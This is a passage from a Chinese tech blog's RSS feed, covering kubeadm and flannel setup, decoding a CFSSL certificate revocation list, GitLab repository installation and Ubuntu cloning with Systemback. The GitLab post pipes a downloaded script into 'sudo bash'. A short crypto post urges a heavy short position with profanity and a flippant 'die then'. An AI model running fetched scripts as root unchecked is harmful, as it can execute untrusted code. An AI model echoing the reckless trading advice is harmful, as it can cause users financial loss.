<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">kubeadm</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> init</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --config</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /root/kubeadm.yml</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>复制集群凭证</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">mkdir</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -p</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> $HOME</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/.kube</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> cp</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -i</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /etc/kubernetes/admin.conf</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> $HOME</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/.kube/config</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> chown</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> $(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">id</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -u</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">$(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">id</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -g</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">) </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">$HOME</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/.kube/config</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>其他节点</strong>加入集群</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">kubeadm</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> join</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 192.168.122.10:6443</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --token</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> abcdef.0123456789abcdef</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66">        --discovery-token-ca-cert-hash</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> sha256:1111c01dff5e4f70xxxxxxxx2b28117487ebe5</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><h2>修改缺失的选项</h2>
<p>这里是为了兼容flannel网络插件做的更改</p>
<h3>controller 需要修改</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">--cluster-cidr</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">10.244.0.0/16</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> \</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">--allocate-node-cidrs=true</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><h3>kube-proxy需要修改</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">clusterCIDR:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 10.244.0.0/16</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h2>安装网络插件</h2>
<blockquote>
<p>这个版本的系统calico是不用想了，实测calico 1.30、1.29、1.28版本都不可能安装。选择flannel的vxlan模式安装</p>
<p>关联项目 https://github.com/flannel-io/flannel</p>
</blockquote>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">wget</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> https://github.com/flannel-io/flannel/releases/latest/download/kube-flannel.yml</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>注意点</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">If</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> you</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> use</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> custom</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> podCIDR</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (not </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">10.244.0.0/16</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">) you first need to download the above manifest and modify the network to match your one.</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>部署</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">kubectl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> apply</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -f</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> flannel.yaml</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">reboot</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>解密CFSSL生成的CRL数据</title>
      <link>https://www.geekery.cn/note-book/SSL/%E8%A7%A3%E5%AF%86CFSSL%E7%94%9F%E6%88%90%E7%9A%84CRL%E6%95%B0%E6%8D%AE.html</link>
      <guid>https://www.geekery.cn/note-book/SSL/%E8%A7%A3%E5%AF%86CFSSL%E7%94%9F%E6%88%90%E7%9A%84CRL%E6%95%B0%E6%8D%AE.html</guid>
      <source url="https://www.geekery.cn/rss.xml">解密CFSSL生成的CRL数据</source>
      <description>解密CFSSL生成的CRL数据 CFSSL 是一个强大的工具，有证书吊销列表（CRL），可是它是加密的。 本文将详细介绍如何使用 curl、jq、base64 和 openssl 工具解密 CFSSL 生成的 CRL 数据。 解密的步骤具体有 从json数据中提取加密的base64数据 解密base64数据获得encode数据 使用openssl进行d...</description>
      <pubDate>Sat, 16 Nov 2024 16:39:05 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p>CFSSL 是一个强大的工具，有证书吊销列表（CRL），可是它是加密的。</p>
<p>本文将详细介绍如何使用 <code>curl</code>、<code>jq</code>、<code>base64</code> 和 <code>openssl</code> 工具解密 CFSSL 生成的 CRL 数据。</p>
<p>解密的步骤具体有</p>
<ul>
<li>从json数据中提取加密的base64数据</li>
<li>解密base64数据获得encode数据</li>
<li>使用openssl进行decode获得pem数据</li>
<li>从pem数据解码获得明文数据</li>
</ul>
<p>其中得益于openssl的功能强大，第三步和第四步可以一步到位，下面将会说明。</p>
</blockquote>
<h2>发送请求获取原始数据</h2>
<p>请求</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">curl</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --location</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --request</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GET</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'http://83.229.120.34:8888/api/v1/cfssl/crl?expiry'</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>请求来的数据如下，其中的result部分是我们需要的base64加密数据。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">{</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    "success"</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> true</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">,</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    "result"</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "MIIBRTCB7AIBATAKBggqhkjOPQQDAjCBlTELMAkGA1UEBhMCQ04xEDAOBgNVBAcTB0JlaWppbmcxKTAnBgNVBAoTIFBhcGVyRHJhZ29uIFRlY2hub2xvZ3kgQ28uLCBMdGQuMSMwIQYDVQQLExpJbnRlcm1lZGlhdGUgQ0EgRGVwYXJ0bWVudDEkMCIGA1UEAxMbUGFwZXJEcmFnb24gSW50ZXJtZWRpYXRlIENBFw0yNDExMTYxNjIzMzZaFw0yNTA5MTIxNjIzMzZaMACgIzAhMB8GA1UdIwQYMBaAFJAzuMyI4AKwil7C6Xj4rPVln4AvMAoGCCqGSM49BAMCA0gAMEUCIQC0xb6UcoCMT5Z7GD6avEbWnRxvdAPVmMZPZqUavmw0YwIgdbF7gsCgF6fUNZm2HXNEzxvHALp0A3WqD20p+13/7X0=",</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    "errors"</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [],</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    "messages"</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> []</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">}</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>我们需要的数据是</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">MIIBRTCB7AIBATAKBggqhkjOPQQDAjCBlTELMAkGA1UEBhMCQ04xEDAOBgNVBAcTB0JlaWppbmcxKTAnBgNVBAoTIFBhcGVyRHJhZ29uIFRlY2hub2xvZ3kgQ28uLCBMdGQuMSMwIQYDVQQLExpJbnRlcm1lZGlhdGUgQ0EgRGVwYXJ0bWVudDEkMCIGA1UEAxMbUGFwZXJEcmFnb24gSW50ZXJtZWRpYXRlIENBFw0yNDExMTYxNjIzMzZaFw0yNTA5MTIxNjIzMzZaMACgIzAhMB8GA1UdIwQYMBaAFJAzuMyI4AKwil7C6Xj4rPVln4AvMAoGCCqGSM49BAMCA0gAMEUCIQC0xb6UcoCMT5Z7GD6avEbWnRxvdAPVmMZPZqUavmw0YwIgdbF7gsCgF6fUNZm2HXNEzxvHALp0A3WqD20p+13/7X0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">=</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h2>解密第一层base64</h2>
<p>尝试使用命令解密，得到数据放到了标准输出，这是不可读的，所以我们要把数据流放到文件里。</p>
<p>错误的解密示范</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">echo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> MIIBRTCB7AIBATAKBggqhkjOPQQDAjCBlTELMAkGA1UEBhMCQ04xEDAOBgNVBAcTB0JlaWppbmcxKTAnBgNVBAoTIFBhcGVyRHJhZ29uIFRlY2hub2xvZ3kgQ28uLCBMdGQuMSMwIQYDVQQLExpJbnRlcm1lZGlhdGUgQ0EgRGVwYXJ0bWVudDEkMCIGA1UEAxMbUGFwZXJEcmFnb24gSW50ZXJtZWRpYXRlIENBFw0yNDExMTYxNjIzMzZaFw0yNTA5MTIxNjIzMzZaMACgIzAhMB8GA1UdIwQYMBaAFJAzuMyI4AKwil7C6Xj4rPVln4AvMAoGCCqGSM49BAMCA0gAMEUCIQC0xb6UcoCMT5Z7GD6avEbWnRxvdAPVmMZPZqUavmw0YwIgdbF7gsCgF6fUNZm2HXNEzxvHALp0A3WqD20p+13/7X0=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">base64</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -d</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">0�E0��0</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">*�H�=0��1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">         0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">      UCN10UBeijing1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'U</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> PaperDragon Technology Co., Ltd.1#0!U</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                      Intermediate CA Department1$0"U0��3�̈���^��x���e��/0</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>正确的解密</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">echo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> MIIBRTCB7AIBATAKBggqhkjOPQQDAjCBlTELMAkGA1UEBhMCQ04xEDAOBgNVBAcTB0JlaWppbmcxKTAnBgNVBAoTIFBhcGVyRHJhZ29uIFRlY2hub2xvZ3kgQ28uLCBMdGQuMSMwIQYDVQQLExpJbnRlcm1lZGlhdGUgQ0EgRGVwYXJ0bWVudDEkMCIGA1UEAxMbUGFwZXJEcmFnb24gSW50ZXJtZWRpYXRlIENBFw0yNDExMTYxNjIzMzZaFw0yNTA5MTIxNjIzMzZaMACgIzAhMB8GA1UdIwQYMBaAFJAzuMyI4AKwil7C6Xj4rPVln4AvMAoGCCqGSM49BAMCA0gAMEUCIQC0xb6UcoCMT5Z7GD6avEbWnRxvdAPVmMZPZqUavmw0YwIgdbF7gsCgF6fUNZm2HXNEzxvHALp0A3WqD20p+13/7X0=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">base64</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -d</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">crl.der</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>这是我们获取了人类无法读取的数据流 crl.der</p>
<h2>第二层解密为pem文件</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">openssl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> crl</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -inform</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DER</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -in</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> crl.der</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -outform</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> PEM</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -out</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> crl.pem</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>这时我们得到了pem文件如下</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>已经在谷底了 怎么走都是向上</title>
      <link>https://www.geekery.cn/note-book/%E5%B8%81%E5%9C%88%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/%E5%B7%B2%E7%BB%8F%E5%9C%A8%E8%B0%B7%E5%BA%95%E4%BA%86%E6%80%8E%E4%B9%88%E8%B5%B0%E9%83%BD%E6%98%AF%E5%90%91%E4%B8%8A.html</link>
      <guid>https://www.geekery.cn/note-book/%E5%B8%81%E5%9C%88%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/%E5%B7%B2%E7%BB%8F%E5%9C%A8%E8%B0%B7%E5%BA%95%E4%BA%86%E6%80%8E%E4%B9%88%E8%B5%B0%E9%83%BD%E6%98%AF%E5%90%91%E4%B8%8A.html</guid>
      <source url="https://www.geekery.cn/rss.xml">已经在谷底了 怎么走都是向上</source>
      <description>已经在谷底了 怎么走都是向上 文字版 视频版 本站播放器</description>
      <pubDate>Tue, 05 Nov 2024 14:57:03 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>文字版</h2>
<div class="language-txt line-numbers-mode" data-highlighter="shiki" data-ext="txt" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>已经在谷底了，怎么走都是向上。</span></span>
<span class="line"><span>所以？</span></span>
<span class="line"><span>直接重仓空进去，操你妈，死了算了。</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>视频版</h2>
<h3>本站播放器</h3>
]]></content:encoded>
    </item>
    <item>
      <title>GitLab一键设置镜像源</title>
      <link>https://www.geekery.cn/note-book/Gitlab/Gitlab%E4%B8%80%E9%94%AE%E8%AE%BE%E7%BD%AE%E9%95%9C%E5%83%8F%E6%BA%90.html</link>
      <guid>https://www.geekery.cn/note-book/Gitlab/Gitlab%E4%B8%80%E9%94%AE%E8%AE%BE%E7%BD%AE%E9%95%9C%E5%83%8F%E6%BA%90.html</guid>
      <source url="https://www.geekery.cn/rss.xml">GitLab一键设置镜像源</source>
      <description>GitLab一键设置镜像源 这个镜像源里面包含Gitlab安装包，Gitlab-Runner安装包. gitlab-runner gitlab 添加源 Debian/Ubuntu/Mint RHEL/CentOS/Fedora/Amazon Linux</description>
      <pubDate>Thu, 31 Oct 2024 05:51:41 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p>这个镜像源里面包含Gitlab安装包，Gitlab-Runner安装包.
gitlab-runner
gitlab</p>
</blockquote>
<h2>添加源</h2>
<h3>Debian/Ubuntu/Mint</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">curl</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -L</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "https://packages.gitlab.com/install/repositories/runner/gitlab-runner/script.deb.sh"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bash</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>RHEL/CentOS/Fedora/Amazon Linux</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">curl</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -L</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "https://packages.gitlab.com/install/repositories/runner/gitlab-runner/script.rpm.sh"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bash</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Ubuntu备份为LiveOS</title>
      <link>https://www.geekery.cn/note-book/OperaSystems/Ubuntu/Ubuntu%E5%A4%87%E4%BB%BD%E4%B8%BALiveOS.html</link>
      <guid>https://www.geekery.cn/note-book/OperaSystems/Ubuntu/Ubuntu%E5%A4%87%E4%BB%BD%E4%B8%BALiveOS.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Ubuntu备份为LiveOS</source>
      <description>Ubuntu备份为LiveOS 基于Systemback工具实现Ubuntu系统的镜像归档、复制和克隆安装 https://zhuanlan.zhihu.com/p/375912899 一、准备工作 待克隆的Ubuntu系统主机 U盘（≥8GB） 新的主机（操作系统不限） 二、注意事项 请勿将主程序安装在系统根目录“/”下，否则可能导致克隆失败，建议安...</description>
      <pubDate>Tue, 29 Oct 2024 03:33:26 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p>基于Systemback工具实现Ubuntu系统的镜像归档、复制和克隆安装</p>
<p>https://zhuanlan.zhihu.com/p/375912899</p>
</blockquote>
<h2>一、准备工作</h2>
<ol>
<li>待克隆的Ubuntu系统主机</li>
<li>U盘（≥8GB）</li>
<li>新的主机（操作系统不限）</li>
</ol>
<h2>二、注意事项</h2>
<p>请勿将主程序安装在系统根目录“/”下，否则可能导致克隆失败，建议安装在<code>/opt</code>目录下。</p>
<h3>步骤</h3>
<ol>
<li><strong>安装Systemback工具</strong></li>
<li><strong>制作镜像</strong></li>
<li><strong>刻录U盘</strong></li>
<li><strong>U盘启动安装</strong></li>
</ol>
<h3>安装Systemback工具</h3>
<ol>
<li>下载：<a href="https://nchc.dl.sourceforge.net/project/systemback/1.8/Systemback_Install_Pack_v1.8.402.tar.xz" target="_blank" rel="noopener noreferrer">Systemback_Install_Pack_v1.8.402.tar.xz</a></li>
<li>解压：<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">tar</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -xvf</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ./Systemback_Install_Pack_v1.8.402.tar.xz</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div></li>
<li>安装：<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">cd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Systemback_Install_Pack_v1.8.402/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bash</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install.sh</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div></li>
<li>注意：Systemback支持的Ubuntu版本最高为Ubuntu 16，可在安装提示中选择“4 ─ Ubuntu 16.04.X LTS (Xenial Xerus)”。</li>
</ol>
<p>安装成功后，屏幕将打印出 <code>Systemback installation is successful.</code></p>
<p></p>
<h3>使用Systemback制作系统镜像并写入U盘</h3>
<ol>
<li>
<p>在“应用中心”（按下Win键）搜索并打开Systemback。</p>
<p></p>
</li>
<li>
<p>输入用户密码登录后，进入主界面。</p>
<p></p>
</li>
<li>
<p>点击“创建Live系统”，输入镜像名称，勾选“包含用户数据文件”，然后点击“创建新的”镜像，等待完成。</p>
<p></p>
</li>
<li>
<p>完成后，会提示写入U盘，点击“确定”后返回主界面。</p>
<p></p>
</li>
<li>
<p>在主界面中，选择刚创建的镜像文件，选中待写入的U盘（U盘为ext4格式，若未检测到，请点击刷新按钮），然后点击“向目标设备写入”开始刻录U盘。</p>
<p></p>
</li>
</ol>
<p>等待写入完成后，一个Live模式的Ubuntu系统盘即制作完成。</p>
<p><strong>特别说明</strong>：此模式创建的镜像不是标准的ISO文件，而是Live模式的镜像。如果需要制作ISO文件，可点击“转存为光盘镜像”按钮制作。由于ISO文件不能大于4GB，若系统文件超过4GB，也可尝试通过其他方法解决（详见Systemback相关教程）。</p>
<h2>使用U盘安装</h2>
<ol>
<li>
<p>插入U盘至新主机，设置BIOS为U盘启动。</p>
</li>
<li>
